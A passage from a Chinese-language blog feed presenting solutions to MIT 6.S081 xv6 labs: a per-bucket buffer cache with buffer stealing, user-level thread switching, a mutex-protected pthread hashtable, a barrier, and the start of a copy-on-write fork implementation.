class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">buf</span>*</span></span><br><span class="line"><span class="class"><span class="title">bget</span>(<span class="title">uint</span> <span class="title">dev</span>, <span class="title">uint</span> <span class="title">blockno</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line"></span><br><span class="line">  uint idx = ihash(blockno);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;bcache.lock[idx]);</span><br><span class="line">  <span class="keyword">for</span> (b = bcache.head[idx].next; b != &amp;bcache.head[idx]; b = b-&gt;next) {</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) {</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached, find LRU</span></span><br><span class="line">  <span class="keyword">for</span> (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) {</span><br><span class="line">    <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) {</span><br><span class="line">      b-&gt;dev = dev;</span><br><span class="line">      b-&gt;blockno = blockno;</span><br><span class="line">      b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  acquire(&amp;bcache.steal_lock);</span><br><span class="line">  acquire(&amp;bcache.lock[idx]);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (b = bcache.head[idx].next; b != &amp;bcache.head[idx]; b = b-&gt;next) {</span><br><span class="line">    <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) {</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.steal_lock);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached, find LRU</span></span><br><span class="line">  <span class="keyword">for</span> (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) {</span><br><span class="line">    <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) {</span><br><span class="line">      b-&gt;dev = dev;</span><br><span class="line">      b-&gt;blockno = blockno;</span><br><span class="line">      b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.steal_lock);</span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// steal from other bucket</span></span><br><span class="line">  uint _idx = idx;</span><br><span class="line">  idx = ihash(idx + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> (idx != _idx) {      </span><br><span class="line"></span><br><span class="line">    acquire(&amp;bcache.lock[idx]);</span><br><span class="line">    <span class="comment">// Not cached; recycle an unused buffer.</span></span><br><span class="line">    <span class="keyword">for</span> (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) {</span><br><span class="line">      <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) {</span><br><span class="line">        b-&gt;dev = dev;</span><br><span class="line">        b-&gt;blockno = blockno;</span><br><span class="line">        b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">        b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">        b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">        b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line">        <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">        b-&gt;next = bcache.head[_idx].next;</span><br><span class="line">        b-&gt;prev = &amp;bcache.head[_idx];</span><br><span class="line">        b-&gt;next-&gt;prev = b;</span><br><span class="line">        b-&gt;prev-&gt;next = b;</span><br><span class="line">        <span class="built_in">release</span>(&amp;bcache.lock[_idx]);</span><br><span class="line">        <span class="built_in">release</span>(&amp;bcache.steal_lock);</span><br><span class="line">        acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">    idx = ihash(idx + <span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock[_idx]);</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.steal_lock);</span><br><span class="line"></span><br><span class="line">  panic(<span class="string">"bget: no buffers"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上面的代码中，在当前<code>bucket</code>中两次查看<code>block</code>是否已经被缓存或者有空闲<code>buf</code>可用，第二次使用了整个<code>bcache</code>的大锁。在我最开始的设计中，当前<code>bucket</code>中找不到可用<code>buf</code>时，直接尝试从其他<code>bucket</code> steal，这会导致潜在的死锁问题，当出现A steal from B，B steal from A的情况，就会死锁，这种情况代表了所有<code>buf</code>被消耗殆尽，这时应该执行到末尾的<code>panic</code>，而不能死锁在这里。</p><p>测试中应该没有同时消耗掉所有<code>buf</code>，所以死锁并不会出现，但还是应该在设计上避免死锁，所以使用了整个<code>bcache</code>的大锁<code>steal_lock</code>。当任何进程想要从其他<code>bucket</code> steal <code>buf</code>时，需要持有该锁，并且需要重复之前的扫描操作，防止执行空隙中有其他进程缓存了对应<code>block</code>，破坏操作的原子性，导致一个<code>block</code>被缓存两次。<code>steal_lock</code>仅影响steal，当<code>steal_lock</code>被持有，不参与steal的其他<code>bucket</code>仍可以被并发地<code>bget()</code>。该设计需要感谢<a href="https://zhuanlan.zhihu.com/p/350624682">知乎<code>iced coffe</code></a>。</p><p>之后修改剩余的相关函数：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">brelse(struct buf *b)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">"brelse"</span>);</span><br><span class="line"></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  uint idx = ihash(b-&gt;blockno);</span><br><span class="line">  acquire(&amp;bcache.lock[idx]);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) {</span><br><span class="line">    <span class="comment">// move to head</span></span><br><span class="line">    b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line">    b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">    b-&gt;next = bcache.head[idx].next;</span><br><span class="line">    b-&gt;prev = &amp;bcache.head[idx];</span><br><span class="line">    bcache.head[idx].next-&gt;prev = b;</span><br><span class="line">    bcache.head[idx].next = b;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">bpin(struct buf *b) {</span><br><span class="line">  uint idx = ihash(b-&gt;blockno);</span><br><span class="line">  acquire(&amp;bcache.lock[idx]);</span><br><span class="line">  b-&gt;refcnt++;</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">bunpin(struct buf *b) {</span><br><span class="line">  uint idx = ihash(b-&gt;blockno);</span><br><span class="line">  acquire(&amp;bcache.lock[idx]);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock[idx]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成改进后，再进行<code>bcachetest</code>测试：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ bcachetest</span><br><span class="line">start test0</span><br><span class="line">test0 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: bcache.bucket0: <span class="comment">#fetch-and-add 0 #acquire() 6174</span></span><br><span class="line">lock: bcache.bucket1: <span class="comment">#fetch-and-add 0 #acquire() 6176</span></span><br><span class="line">lock: bcache.bucket2: <span class="comment">#fetch-and-add 0 #acquire() 6336</span></span><br><span class="line">lock: bcache.bucket3: <span class="comment">#fetch-and-add 0 #acquire() 6328</span></span><br><span class="line">lock: bcache.bucket4: <span class="comment">#fetch-and-add 0 #acquire() 4270</span></span><br><span class="line">lock: bcache.bucket5: <span class="comment">#fetch-and-add 0 #acquire() 4264</span></span><br><span class="line">lock: bcache.bucket6: <span class="comment">#fetch-and-add 0 #acquire() 2680</span></span><br><span class="line">lock: bcache.bucket7: <span class="comment">#fetch-and-add 0 #acquire() 4672</span></span><br><span class="line">lock: bcache.bucket8: <span class="comment">#fetch-and-add 0 #acquire() 4400</span></span><br><span class="line">lock: bcache.bucket9: <span class="comment">#fetch-and-add 0 #acquire() 4121</span></span><br><span class="line">lock: bcache.bucket10: <span class="comment">#fetch-and-add 0 #acquire() 4169</span></span><br><span class="line">lock: bcache.bucket11: <span class="comment">#fetch-and-add 0 #acquire() 6178</span></span><br><span class="line">lock: bcache.bucket12: <span class="comment">#fetch-and-add 0 #acquire() 6176</span></span><br><span class="line">lock: bcache: <span class="comment">#fetch-and-add 0 #acquire() 7</span></span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: virtio_disk: <span class="comment">#fetch-and-add 144778 #acquire() 1197</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 82509 #acquire() 73738</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 8076 #acquire() 73425</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 7466 #acquire() 73385</span></span><br><span class="line">lock: proc: <span class="comment">#fetch-and-add 7014 #acquire() 73384</span></span><br><span class="line">tot= 0</span><br><span class="line">test0: OK</span><br><span class="line">start test1</span><br><span class="line">test1 OK</span><br></pre></td></tr></tbody></table></figure><p>可见<code>bcache</code>锁的竞争消失了。</p><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/lock">GitHub仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> lock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab7 thread</title>
      <link href="2021/02/28/6-s081-lab7-thread/"/>
      <url>2021/02/28/6-s081-lab7-thread/</url>
      
        <content type="html"><![CDATA[<p>本实验室将让你熟悉多线程。您将在用户级线程包中实现线程切换；使用多线程来加快程序的速度；并实现一个<code>barrier</code>。</p><h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><p>实验代码中为我们提供了一个用户级别线程库，需要我们实现线程切换部分。我们需要给<code>user/uthread.c</code>中的<code>thread_create()</code>和<code>thread_schedule()</code>，以及<code>user/uthread_switch.S</code>中的<code>thread_switch</code>添加代码。</p><a id="more"></a><p>首先，我们为<code>thread</code>添加<code>context</code>以保存<code>callee</code>寄存器值，从<code>kernel/proc.h</code>中复制即可。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> {</span></span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> {</span></span><br><span class="line">  <span class="keyword">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread's stack */</span></span><br><span class="line">  <span class="keyword">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>然后是``thread_create()`：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">thread_create(<span class="keyword">void</span> (*func)())</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) {</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  <span class="comment">// user ra return func in switch</span></span><br><span class="line">  t-&gt;context.ra = (uint64)func;</span><br><span class="line">  <span class="comment">// point to stack top(highest addr)</span></span><br><span class="line">  t-&gt;context.sp = (uint64)t-&gt;<span class="built_in">stack</span> + STACK_SIZE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>利用<code>ra</code>在switch到thread后，返回到函数的位置，将<code>sp</code>指向该<code>thread</code>的栈顶。</p><p>最后是<code>thread_schedule</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (current_thread != next_thread) {         <span class="comment">/* switch threads?  */</span></span><br><span class="line">  next_thread-&gt;state = RUNNING;</span><br><span class="line">  t = current_thread;</span><br><span class="line">  current_thread = next_thread;</span><br><span class="line">  <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  thread_switch((uint64)&amp;t-&gt;context, (uint64)&amp;current_thread-&gt;context);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>至于<code>thread_switch</code>的代码，直接从<code>kernel/switch.S</code>中复制即可。</p><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><p>后面的两关都和<code>xv6</code>无关了，大概是有一些多线程的feature，<code>xv6</code>无法提供，所以需要我们使用<code>pthread</code>。</p><p>实验为我们提供了一个无锁的<code>hashtable</code>，单线程下执行无误，但是多线程执行时，会发生如下问题：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❯ ./ph 2                                                                                                             </span><br><span class="line">100000 puts, 1.780 seconds, 56190 puts/second</span><br><span class="line">0: 16577 keys missing</span><br><span class="line">1: 16577 keys missing</span><br><span class="line">200000 gets, 4.343 seconds, 46055 gets/second</span><br></pre></td></tr></tbody></table></figure><p>这是因为，当两个线程同时插入<code>hashtable</code>的一个<code>bucket</code>时，会导致key丢失。</p><p>我们对<code>put</code>操作加锁即可（不要忘了在<code>main()</code>函数中初始化<code>locks</code>）：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pthread_mutex_t</span> locks[NBUCKET];</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> i = key % NBUCKET;</span><br><span class="line">  pthread_mutex_lock(&amp;locks[i]);</span><br><span class="line">  <span class="comment">// is the key already present?</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">entry</span> *<span class="title">e</span> = 0;</span></span><br><span class="line">  <span class="keyword">for</span> (e = table[i]; e != <span class="number">0</span>; e = e-&gt;next) {</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>(e){</span><br><span class="line">    <span class="comment">// update the existing key.</span></span><br><span class="line">    e-&gt;value = value;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// the new is new.</span></span><br><span class="line">    insert(key, value, &amp;table[i], table[i]);</span><br><span class="line">  }</span><br><span class="line">  pthread_mutex_unlock(&amp;locks[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><p>本关要求我们实现一个<code>barrie</code>：在某个点上，所有相关的的线程必须等待，直到所有其他相关的线程也到达这个点。这个我们参考<code>xv6</code>中的<code>sleep</code>和<code>wait</code>的使用即可：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> </span><br><span class="line">barrier()</span><br><span class="line">{</span><br><span class="line">  <span class="comment">// YOUR CODE HERE</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Block until all threads have called barrier() and</span></span><br><span class="line">  <span class="comment">// then increment bstate.round.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><br><span class="line">  bstate.nthread++;</span><br><span class="line">  <span class="keyword">if</span> (bstate.nthread == nthread) {</span><br><span class="line">    bstate.round++;</span><br><span class="line">    bstate.nthread = <span class="number">0</span>;</span><br><span class="line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><br><span class="line">  }</span><br><span class="line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/thread">GitHub仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> Multithreading </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab6 cow</title>
      <link href="2021/02/27/6-s081-lab6-cow/"/>
      <url>2021/02/27/6-s081-lab6-cow/</url>
      
        <content type="html"><![CDATA[<h1 id="Copy-on-Write-Fork-for-xv6"><a href="#Copy-on-Write-Fork-for-xv6" class="headerlink" title="Copy-on-Write Fork for xv6"></a>Copy-on-Write Fork for xv6</h1><p>这次lab只有一关，那就是为<code>xv6</code>实现<code>copy on write</code>。</p><p><code>xv6</code>中的<code>fork()</code>系统调用将父进程的用户内存全部复制到子进程中。如果父进程内存占用很大，复制可能需要很长的时间。更糟糕的是，通常来说，这个复制在很大程度上是浪费的；例如，在子进程中，<code>fork()</code>之后的<code>exec()</code>调用会导致子进程丢弃复制的内存，可能大部分内存都没有来得及使用。另一方面，如果父子双方都使用一个<code>page</code>，并且其中一方或双方需要写这个<code>page</code>，那么确实需要复制。</p><a id="more"></a><p>根据官网给的提示：</p><ul><li><p>使用引用计数，对每个物理页面维护一个<code>reference count</code>，记录物理页面被map的次数。</p><p><code>kernel/kalloc.c</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">  <span class="keyword">int</span> rc[PHYSTOP / PGSIZE];</span><br><span class="line">} kmem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">freerange(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE) {</span><br><span class="line">    kmem.rc[(uint64)p / PGSIZE] = <span class="number">1</span>;</span><br><span class="line">    kfree(p);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">increase_rc(uint64 pa) {</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.rc[pa / PGSIZE]++;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>利用RISC-V PTE中的<code>RSW (reserved for software)</code>位来标记<code>cow</code>页，修改<code>uvmcopy()</code>,在复制内存时，仅将父进程的物理页面map到子进程页表中，并清除双方<code>PTE</code>中的<code>PTE_W</code>标志。</p><p>在<code>kernel/riscv.h</code>中加入：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_COW (1L &lt;&lt; 8)</span></span><br></pre></td></tr></tbody></table></figure><p>在<code>kernel/vm.c</code>中加入：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 